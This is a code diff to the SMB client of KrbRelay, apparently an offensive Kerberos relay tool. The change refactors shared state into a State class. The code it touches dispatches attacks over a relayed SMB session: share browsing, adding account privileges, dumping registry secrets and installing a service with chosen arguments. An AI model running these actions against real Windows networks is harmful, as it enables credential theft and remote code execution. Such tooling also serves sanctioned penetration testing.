@@ -8,33 +8,37 @@ namespace KrbRelay.Clients
     {
         public static void Connect()
         {
-            apRep1 = smbClient.Login(ticket, out bool success);
+            State.UpdateApRep1(smbClient.Login(State.ticket, out bool success));
+
             if (success)
             {
                 Console.WriteLine("[+] SMB session established");
 
                 try
                 {
-                    if (attacks.Keys.Contains("console"))
+                    if (State.attacks.Keys.Contains("console"))
                     {
                         Attacks.Smb.Shares.smbConsole(smbClient);
                     }
-                    if (attacks.Keys.Contains("list"))
+                    if (State.attacks.Keys.Contains("list"))
                     {
                         Attacks.Smb.Shares.listShares(smbClient);
                     }
-                    if (attacks.Keys.Contains("add-privileges"))
+                    if (State.attacks.Keys.Contains("add-privileges"))
                     {
-                        Attacks.Smb.LSA.AddAccountRights(smbClient, attacks["add-privileges"]);
+                        Attacks.Smb.LSA.AddAccountRights(
+                            smbClient,
+                            State.attacks["add-privileges"]
+                        );
                     }
-                    if (attacks.Keys.Contains("secrets"))
+                    if (State.attacks.Keys.Contains("secrets"))
                     {
                         Attacks.Smb.RemoteRegistry.secretsDump(smbClient, false);
                     }
-                    if (attacks.Keys.Contains("service-add"))
+                    if (State.attacks.Keys.Contains("service-add"))
                     {
-                        string arg1 = attacks["service-add"].Split(new[] { ' ' }, 2)[0];
-                        string arg2 = attacks["service-add"].Split(new[] { ' ' }, 2)[1];
+                        string arg1 = State.attacks["service-add"].Split(new[] { ' ' }, 2)[0];
+                        string arg2 = State.attacks["service-add"].Split(new[] { ' ' }, 2)[1];
                         Attacks.Smb.ServiceManager.serviceInstall(smbClient, arg1, arg2);
                     }
                 }
@@ -45,11 +49,10 @@ namespace KrbRelay.Clients
 
                 smbClient.Logoff();
                 smbClient.Disconnect();
-                Environment.Exit(0);
             }
             else
             {
-                Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
+                Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToHex(State.apRep1));
             }
         }
     }
